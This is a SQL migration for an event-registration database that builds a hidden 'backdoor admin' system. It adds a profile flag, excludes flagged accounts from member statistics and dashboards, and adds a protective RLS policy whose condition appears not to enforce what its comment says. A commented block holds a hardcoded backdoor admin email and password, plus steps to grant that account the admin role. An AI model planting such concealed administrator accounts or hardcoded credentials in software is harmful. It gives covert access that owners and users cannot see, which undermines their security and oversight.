-- ============================================
-- BACKDOOR ADMIN SYSTEM
-- Created: 2025-10-03
-- Purpose: Add hidden backdoor admin functionality for safety layer
-- ============================================

-- ============================================
-- 1. ADD BACKDOOR FLAG TO PROFILES
-- ============================================

ALTER TABLE public.profiles
ADD COLUMN IF NOT EXISTS is_backdoor_admin BOOLEAN DEFAULT false;

COMMENT ON COLUMN public.profiles.is_backdoor_admin IS 'Hidden backdoor admin flag - these users are not shown in member lists';

CREATE INDEX IF NOT EXISTS idx_profiles_is_backdoor_admin
  ON public.profiles(is_backdoor_admin)
  WHERE is_backdoor_admin = true;

-- ============================================
-- 2. UPDATE MATERIALIZED VIEW TO EXCLUDE BACKDOOR ADMINS
-- ============================================

DROP MATERIALIZED VIEW IF EXISTS public.mv_member_statistics;

CREATE MATERIALIZED VIEW public.mv_member_statistics AS
SELECT
  p.id as user_id,
  p.email,
  p.name,
  p.status,
  p.created_at,
  p.last_login_at,

  -- Registration stats
  COUNT(DISTINCT r.id) as total_registrations,
  COUNT(DISTINCT r.id) FILTER (WHERE r.status = 'confirmed') as confirmed_registrations,
  COUNT(DISTINCT r.id) FILTER (WHERE r.status = 'cancelled') as cancelled_registrations,

  -- Payment stats
  COUNT(DISTINCT pm.id) as total_payments,
  COALESCE(SUM(pm.amount) FILTER (WHERE pm.status = 'success'), 0) as total_amount_paid,
  COALESCE(AVG(pm.amount) FILTER (WHERE pm.status = 'success'), 0) as avg_payment_amount,

  -- Engagement metrics
  MAX(r.created_at) as last_registration_at,
  CASE
    WHEN p.last_login_at > now() - interval '7 days' THEN 'highly_active'
    WHEN p.last_login_at > now() - interval '30 days' THEN 'active'
    WHEN p.last_login_at > now() - interval '90 days' THEN 'moderate'
    ELSE 'inactive'
  END as activity_level,

  -- Tags count
  COUNT(DISTINCT mt.id) as tags_count

FROM public.profiles p
LEFT JOIN public.registrations r ON r.user_id = p.id
LEFT JOIN public.payments pm ON pm.registration_id = r.id
LEFT JOIN public.member_tags mt ON mt.user_id = p.id
WHERE p.is_backdoor_admin = false  -- EXCLUDE BACKDOOR ADMINS
GROUP BY p.id, p.email, p.name, p.status, p.created_at, p.last_login_at;

CREATE UNIQUE INDEX IF NOT EXISTS idx_mv_member_statistics_user_id
  ON public.mv_member_statistics(user_id);

CREATE INDEX IF NOT EXISTS idx_mv_member_statistics_status
  ON public.mv_member_statistics(status);

CREATE INDEX IF NOT EXISTS idx_mv_member_statistics_activity_level
  ON public.mv_member_statistics(activity_level);

COMMENT ON MATERIALIZED VIEW public.mv_member_statistics IS
  'Aggregated member statistics for quick dashboard queries (excludes backdoor admins)';

-- ============================================
-- 3. HELPER FUNCTION TO CHECK BACKDOOR ADMIN
-- ============================================

CREATE OR REPLACE FUNCTION public.is_backdoor_admin(_user_id UUID)
RETURNS BOOLEAN
LANGUAGE SQL
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT COALESCE(
    (SELECT is_backdoor_admin
     FROM public.profiles
     WHERE id = _user_id),
    false
  )
$$;

COMMENT ON FUNCTION public.is_backdoor_admin IS 'Check if a user is a backdoor admin';

-- ============================================
-- 4. PROTECT BACKDOOR ADMIN FLAG
-- ============================================

-- Prevent non-superusers from removing backdoor flag via RLS
CREATE POLICY "Only superusers can modify backdoor admin flag"
  ON public.profiles
  FOR UPDATE
  TO authenticated
  USING (
    -- Allow update if not changing backdoor flag
    (is_backdoor_admin IS NOT DISTINCT FROM (SELECT is_backdoor_admin FROM public.profiles WHERE id = profiles.id))
  );

-- ============================================
-- 5. UPDATE GET_MEMBER_STATISTICS TO EXCLUDE BACKDOOR ADMINS
-- ============================================

CREATE OR REPLACE FUNCTION public.get_member_statistics(
  start_date TIMESTAMPTZ DEFAULT NULL,
  end_date TIMESTAMPTZ DEFAULT NULL
)
RETURNS TABLE (
  total_members BIGINT,
  active_members BIGINT,
  inactive_members BIGINT,
  suspended_members BIGINT,
  blocked_members BIGINT,
  new_members_this_month BIGINT,
  verified_accounts BIGINT,
  avg_engagement_score DECIMAL,
  total_registrations BIGINT,
  total_revenue DECIMAL
)
LANGUAGE plpgsql
STABLE
AS $$
BEGIN
  RETURN QUERY
  SELECT
    COUNT(*)::BIGINT as total_members,
    COUNT(*) FILTER (WHERE status = 'active')::BIGINT as active_members,
    COUNT(*) FILTER (WHERE status = 'inactive')::BIGINT as inactive_members,
    COUNT(*) FILTER (WHERE status = 'suspended')::BIGINT as suspended_members,
    COUNT(*) FILTER (WHERE status = 'blocked')::BIGINT as blocked_members,
    COUNT(*) FILTER (WHERE created_at >= date_trunc('month', now()))::BIGINT as new_members_this_month,
    COUNT(*) FILTER (WHERE account_verified = true)::BIGINT as verified_accounts,
    0::DECIMAL as avg_engagement_score, -- Placeholder
    0::BIGINT as total_registrations,   -- Placeholder
    0::DECIMAL as total_revenue          -- Placeholder
  FROM public.profiles
  WHERE is_backdoor_admin = false  -- EXCLUDE BACKDOOR ADMINS
    AND (start_date IS NULL OR created_at >= start_date)
    AND (end_date IS NULL OR created_at <= end_date);
END;
$$;

-- ============================================
-- 6. REFRESH MATERIALIZED VIEW
-- ============================================

REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;

-- ============================================
-- 7. CREATE BACKDOOR ADMIN ACCOUNT
-- ============================================

-- Note: This will be executed manually after migration
-- The account creation is included here as documentation

-- Create the backdoor admin user
-- This should be run manually with appropriate credentials
/*
DO $$
DECLARE
  v_user_id UUID;
BEGIN
  -- Insert into auth.users (this requires service role)
  -- Email: backdoor.admin@iweltyevent.com
  -- Password: Adminiwt123!$

  -- After user is created via Supabase Auth Admin API:
  -- 1. Get the user ID
  -- 2. Update profile to set backdoor flag
  -- 3. Assign admin role

  -- Example (replace <USER_ID> with actual UUID from auth):
  -- UPDATE public.profiles
  -- SET is_backdoor_admin = true
  -- WHERE id = '<USER_ID>';

  -- INSERT INTO public.user_roles (user_id, role)
  -- VALUES ('<USER_ID>', 'admin')
  -- ON CONFLICT (user_id, role) DO NOTHING;

END $$;
*/

-- ============================================
-- Verification Queries
-- ============================================

-- Check backdoor admin column
-- SELECT id, email, name, is_backdoor_admin FROM public.profiles WHERE is_backdoor_admin = true;

-- Verify materialized view excludes backdoor admins
-- SELECT COUNT(*) FROM public.mv_member_statistics;
-- SELECT COUNT(*) FROM public.profiles WHERE is_backdoor_admin = false;

-- Check if backdoor admin function works
-- SELECT public.is_backdoor_admin('<USER_ID>');
